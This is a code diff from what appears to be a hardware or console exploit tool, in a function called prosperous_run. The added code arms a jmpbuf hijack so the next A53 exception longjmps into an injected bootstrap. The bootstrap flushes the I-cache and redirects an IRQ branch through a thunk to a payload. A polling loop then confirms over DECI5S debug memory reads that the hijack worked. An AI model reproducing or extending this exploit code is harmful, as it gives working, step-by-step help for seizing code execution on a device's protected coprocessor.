@@ -236,17 +236,42 @@ int prosperous_run(void)
     tmr_restore_tmr20(&ctx);
     printf("[+] TMR 20 restored\n");
 
-    /* Give the A53 time to process the QAF flag and activate the payload.
-     * The payload hooks mDbg_intr via SError handler - the A53 needs to
-     * take an interrupt cycle to activate the hook. */
-    printf("[*] Waiting for MP4 payload activation...\n");
-    usleep(500000); /* 500ms */
+    /* Wait for bootstrap to fire via jmpbuf hijack.
+     *
+     * The jmpbuf trigger is armed: qword_123180 != 0. The next A53 exception
+     * (any IRQ, SError, etc.) will:
+     *   1. Exception handler sees qword_123180 != 0
+     *   2. Calls sub_107BE0 (longjmp) → RETs to bootstrap at 0x883F0000
+     *   3. Bootstrap does IC IALLU (flushes all I-cache)
+     *   4. Bootstrap clears qword_123180 (one-shot)
+     *   5. Bootstrap ERETs to 0x108BF4 (safe IRQ handler loop)
+     *   6. Next IRQ: BL at 0x108BD4 now fetches patched instruction from DRAM
+     *      → calls thunk at 0x1E0000 → thunk calls payload at 0x883F1000
+     *
+     * We poll qword_123180 via DECI5S to confirm bootstrap ran.
+     */
+    printf("[*] Waiting for I-cache flush bootstrap...\n");
+    for (int i = 0; i < 20; i++) {
+        usleep(250000); /* 250ms per check */
+        uint64_t jmpbuf_check = 0xDEAD;
+        deci5s_read_mem(A53_DRAM_PA_BASE + A53_JMPBUF_PTR_OFF, &jmpbuf_check, 8);
+        printf("[DIAG] qword_123180 = 0x%llx %s\n",
+               (unsigned long long)jmpbuf_check,
+               jmpbuf_check == 0 ? "(CLEARED — bootstrap ran!)" : "(still armed)");
+        if (jmpbuf_check == 0) {
+            printf("[+] Bootstrap IC IALLU confirmed — I-cache flushed!\n");
+            break;
+        }
+    }
 
-    /* Diagnostic: c2p reg 0 state (now using DECI5S doorbell for commands) */
+    /* Brief additional wait for thunk to become active after I-cache flush */
+    usleep(500000);
+
+    /* Diagnostic: c2p reg 0 state */
     {
         intptr_t bar2 = (intptr_t)(ctx.dmap_base + MP4_BAR2_PA);
         uint32_t c2p0_val = kernel_getint(bar2 + MP4_C2P_REG(0, 0));
-        printf("[DIAG] c2p reg 0: 0x%08x (will use DECI5S doorbell)\n", c2p0_val);
+        printf("[DIAG] c2p reg 0: 0x%08x\n", c2p0_val);
         uint32_t p2c0_val = kernel_getint(bar2 + MP4_P2C_REG0(0));
         printf("[DIAG] p2c reg 0: 0x%08x\n", p2c0_val);
     }
